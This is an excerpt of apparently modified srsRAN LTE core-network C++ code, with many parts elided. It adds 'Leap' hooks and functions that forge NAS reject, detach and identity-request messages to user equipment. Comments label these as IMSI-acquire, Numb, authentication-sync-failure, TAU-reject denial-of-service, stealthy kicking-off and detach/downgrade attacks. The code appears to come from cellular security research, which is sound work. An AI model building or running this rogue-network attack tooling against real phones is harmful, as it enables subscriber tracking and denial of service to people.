...
/****************************** Leap ******************************/
extern leap_info_t* leap_info;

void nas::leap_send_authentication_reject(s1ap_interface_nas* s1ap)
{
  srsran::unique_byte_buffer_t nas_tx;
  nas_tx = srsran::make_byte_buffer();
  if (nas_tx == nullptr) 
  {
    printf("Couldn't allocate PDU for authentication_reject\n");
    return;
  }
  pack_authentication_reject(nas_tx.get());
  s1ap->send_downlink_nas_transport(m_ecm_ctx.enb_ue_s1ap_id, m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), m_ecm_ctx.enb_sri);
}

void nas::leap_send_detach_request(s1ap_interface_nas* s1ap)
{
  srsran::unique_byte_buffer_t nas_tx;
  nas_tx = srsran::make_byte_buffer();
  if (nas_tx == nullptr) 
  {
    printf("Couldn't allocate PDU for detach_request\n");
    return;
  }
  pack_detach_request(nas_tx.get());
  s1ap->send_downlink_nas_transport(m_ecm_ctx.enb_ue_s1ap_id, m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), m_ecm_ctx.enb_sri);
}

void nas::leap_send_tau_reject(s1ap_interface_nas* s1ap)
{
  srsran::unique_byte_buffer_t nas_tx;
  nas_tx = srsran::make_byte_buffer();
  if (nas_tx == nullptr) 
  {
    printf("Couldn't allocate PDU for tau_reject\n");
    return;
  }
  pack_tracking_area_update_reject(nas_tx.get(), LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED);
  // pack_tracking_area_update_reject(nas_tx.get(), LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_AND_NON_EPS_SERVICES_NOT_ALLOWED); 
  s1ap->send_downlink_nas_transport(m_ecm_ctx.enb_ue_s1ap_id, m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), m_ecm_ctx.enb_sri);
}

void nas::leap_send_identity_request(s1ap_interface_nas* s1ap)
{
  srsran::unique_byte_buffer_t nas_tx;
  nas_tx = srsran::make_byte_buffer();
  if (nas_tx == nullptr) 
  {
    printf("Couldn't allocate PDU for identity_request\n");
    return;
  }
...
void nas::leap_send_attach_reject(s1ap_interface_nas* s1ap)
{
  srsran::unique_byte_buffer_t nas_tx;
  nas_tx = srsran::make_byte_buffer();
  if (nas_tx == nullptr) 
  {
    printf("Couldn't allocate PDU for attach_reject\n");
    return;
  }
  pack_attach_reject(nas_tx.get());
  s1ap->send_downlink_nas_transport(m_ecm_ctx.enb_ue_s1ap_id, m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), m_ecm_ctx.enb_sri);
}
/****************************** Leap ******************************/
...
bool nas::handle_imsi_attach_request_unknown_ue(uint32_t                                              enb_ue_s1ap_id,
                                                ...
                                                const nas_if_t&                                       itf)
{
  printf("handle_imsi_attach_request_unknown_ue\n");
  ...
  /****************************** Leap ******************************/
  printf("Leap: communicate with client at [nas::handle_imsi_attach_request_unknown_ue()]\n");

  leap_info->leap_message_id     = LEAP_INITIAL_NAS_DATA;
  leap_info->leap_s1ap           = s1ap;
  leap_info->leap_imsi           = imsi;
  leap_info->leap_nas_ctx        = nas_ctx;
  leap_info->leap_enb_ue_s1ap_id = enb_ue_s1ap_id;
  leap_info->leap_eps_bearer_id  = eps_bearer_id;

  // act_def_eps_bearer_context_req.eps_bearer_id = 5; ???
  // printf("Leap: [initial_attach_request] eps_bearer_id = %d", eps_bearer_id); // 0

  // 1.IMSI Aquire Attack
  // 2.Numb Attack
  // 3.Authentication Sync Failure Attack
  pthread_t leap_tid;
  pthread_create(&leap_tid, NULL, communicate_with_client, leap_info);

  // wait
  pthread_join(leap_tid, NULL);
  printf("Leap: communicate with client finished\n");
  /****************************** Leap ******************************/
...
bool nas::handle_imsi_attach_request_known_ue(nas*                                                  nas_ctx,
                                              ...
                                              const nas_if_t&                                       itf)
{
  printf("handle_imsi_attach_request_known_ue\n");
...
{
  printf("handle_guti_attach_request_unknown_ue\n");
...
bool nas::handle_guti_attach_request_known_ue(nas*                                                  nas_ctx,
                                              ...
                                              const nas_if_t&                                       itf)
{
  printf("handle_guti_attach_request_known_ue\n");
...
{
  /****************************** Leap ******************************/
  printf("Leap: communicate with client at [nas::handle_tracking_area_update_request()]\n");

  leap_info->leap_message_id = LEAP_TAU_REQUEST;

  // 1.dos attack use tau reject
  pthread_t leap_tid;
  pthread_create(&leap_tid, NULL, communicate_with_client, leap_info);
...
bool nas::handle_attach_complete(srsran::byte_buffer_t* nas_rx)
{
  ...
  /****************************** Leap ******************************/
  printf("Leap: communicate with client at [nas::handle_attach_complete()]\n");

  leap_info->leap_message_id = LEAP_ATTACH_COMPLETE;

  // 1.Stealthy Kicking-off Attack
  // 2.Detach/Downgrade Attack
  pthread_t leap_tid;
  pthread_create(&leap_tid, NULL, communicate_with_client, leap_info);
...
bool nas::handle_authentication_failure(srsran::byte_buffer_t* nas_rx)
{
  ...
  switch (auth_fail.emm_cause) {
    ...
    case 21:
      ...
      /****************************** Leap ******************************/
      printf("Leap: communicate with client at [nas::handle_authentication_failure()]\n");

      leap_info->leap_message_id = LEAP_AUTH_FAILURE;

      // the second auth_sync_failure attack
      pthread_t leap_tid;
      pthread_create(&leap_tid, NULL, communicate_with_client, leap_info);
...
bool nas::pack_detach_request(srsran::byte_buffer_t* nas_buffer)
{
  ...
  uint8_t sec_hdr_type = 2;
  m_sec_ctx.dl_nas_count++;
  LIBLTE_ERROR_ENUM err = liblte_mme_pack_detach_request_msg(&detach_req, sec_hdr_type, m_sec_ctx.dl_nas_count, (LIBLTE_BYTE_MSG_STRUCT*)nas_buffer);
  if (err != LIBLTE_SUCCESS) {
    m_logger.error("Error packing Detach Request");
    srsran::console("Error packing Detach Request\n");
    return false;
  }
...
bool nas::pack_attach_reject(srsran::byte_buffer_t* nas_buffer)
{
